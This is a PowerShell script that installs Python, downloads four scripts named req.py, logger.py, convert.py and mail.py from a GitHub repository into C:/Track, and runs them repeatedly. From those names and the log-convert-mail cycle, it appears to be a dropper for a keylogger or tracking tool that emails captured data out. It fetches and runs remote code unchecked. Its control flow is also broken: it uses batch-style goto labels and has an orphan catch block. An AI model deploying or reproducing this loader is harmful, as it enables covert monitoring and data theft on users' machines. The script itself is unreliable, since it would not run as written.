# Check if Python is installed
python --version | Out-Null
if ($LASTEXITCODE -ne 0) {
    Write-Host "Python is not installed. Installing Python..."
    winget install --id Python.Python
} else {
    Write-Host "Python is already installed."
}

# Set the base path to C:/Track
$BASE_PATH = "C:/Track"

# Create the base path if it does not exist
if (-not (Test-Path $BASE_PATH)) {
    New-Item -ItemType Directory -Path $BASE_PATH
}

# Define GitHub repository URL
$REPO_URL = "https://raw.githubusercontent.com/dhruvoneknotone/Track/main/"  # Update with your GitHub username and repo

# Download Python scripts from GitHub
Invoke-WebRequest -Uri "$REPO_URL/req.py" -OutFile "$BASE_PATH/req.py"
Invoke-WebRequest -Uri "$REPO_URL/logger.py" -OutFile "$BASE_PATH/logger.py"
Invoke-WebRequest -Uri "$REPO_URL/convert.py" -OutFile "$BASE_PATH/convert.py"
Invoke-WebRequest -Uri "$REPO_URL/mail.py" -OutFile "$BASE_PATH/mail.py"

# Execute Python scripts
Start-Process cmd -ArgumentList "python `"$BASE_PATH/req.py`""
if ($LASTEXITCODE -eq 1) { throw "Error executing req.py" }

:loop
# Check if required files exist
foreach ($file in @("logger.py", "convert.py", "mail.py")) {
    if (-not (Test-Path "$BASE_PATH/$file")) {
        Write-Host "Error: $file not found in $BASE_PATH"
        Start-Process cmd -ArgumentList "pause"
        throw "File not found"
    }
}

Start-Process cmd -ArgumentList "python `"$BASE_PATH/logger.py`""
if ($LASTEXITCODE -eq 1) { throw "Error executing logger.py" }

Start-Process cmd -ArgumentList "python `"$BASE_PATH/convert.py`""
if ($LASTEXITCODE -eq 1) { throw "Error executing convert.py" }

Start-Sleep -Seconds 5

Start-Process cmd -ArgumentList "python `"$BASE_PATH/mail.py`""
if ($LASTEXITCODE -eq 1) { throw "Error executing mail.py" }

goto loop

catch {
    Write-Host "An error occurred while executing a Python script."
    Start-Process cmd -ArgumentList "pause"
    throw "Python script execution error"
}